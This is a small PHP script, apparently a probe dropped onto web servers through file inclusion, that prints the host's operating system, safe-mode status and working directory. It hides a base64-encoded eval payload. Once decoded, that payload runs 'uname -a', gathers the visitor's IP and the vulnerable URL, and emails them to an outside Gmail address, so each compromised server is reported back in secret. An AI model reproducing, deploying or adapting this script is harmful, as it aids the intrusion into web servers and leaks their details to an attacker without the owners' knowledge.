<?
$win = strtolower(substr(PHP_OS,0,3)) == "win";
echo "PLaTo<br>";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "<<".$hsafemode.">> ".$xos."";
echo "<center><A class=ria href=\"http://".$OS."\">";echo "PLaTo</A></center><br>";
echo "<br>OSTYPE:$OS<br>";
echo "<br>Pwd:$xpwd<br>";
eval(base64_decode("aWYgKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSBvciBzdHJ0b2xvd2VyKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSkgPT0gIm9uIikgeyAkc2FmZW1vZGUgPSAiT04iOyB9IGVsc2UgeyAkc2FmZW1vZGUgPSAiT0ZGIjsgfSAkdmlzaXRvciA9ICRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOyAkZmxvYXQgPSAiRnJvbSA6IHZ1cmwgaW5mbyA8ZnVsbEBpbmZvLmNvbT4iOyAkYXJhbiA9IGV4ZWMoJ3VuYW1lIC1hOycpOyAkd2ViID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOyAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07ICRib2R5ID0gIkJ1ZyBodHRwOi8vIi4kd2ViLiRpbmouIm5uU3ByZWFkIFZpYSA6ICIuJHZpc2l0b3IuIm5uS2VybmVsIFZlcnNpb24gOiAiLiRhcmFuLiJublNhZmUgTW9kZSA6ICIuJHNhZmVtb2RlOyBtYWlsKCJnZWlzaGFzb3BoaWVAZ21haWwuY29tIiwiU2V0b3JhbiBCb3MgIi4kc2FmZW1vZGUsJGJvZHksJGZsb2F0KTs="));
die("<center> ByroeNet </center>");
?>